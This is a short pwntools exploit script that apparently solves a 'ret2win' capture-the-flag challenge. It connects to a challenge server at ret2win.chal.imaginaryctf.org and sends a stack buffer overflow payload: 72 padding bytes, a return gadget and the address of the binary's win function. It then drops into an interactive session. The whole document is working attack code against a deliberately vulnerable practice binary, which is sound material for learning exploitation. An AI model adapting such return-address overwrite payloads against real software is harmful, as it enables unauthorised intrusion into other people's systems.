from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.update(
    terminal='kitty',
    log_level='debug'
)

c = '''
b* 0x0000000000401179
c
'''

p = remote('ret2win.chal.imaginaryctf.org', 1337)
# p = elf.process()
# gdb.attach(p,c)

payload = b'a'*72+p64(0x000000000040101a)+p64(elf.sym.win)
p.sendline(payload)

p.interactive()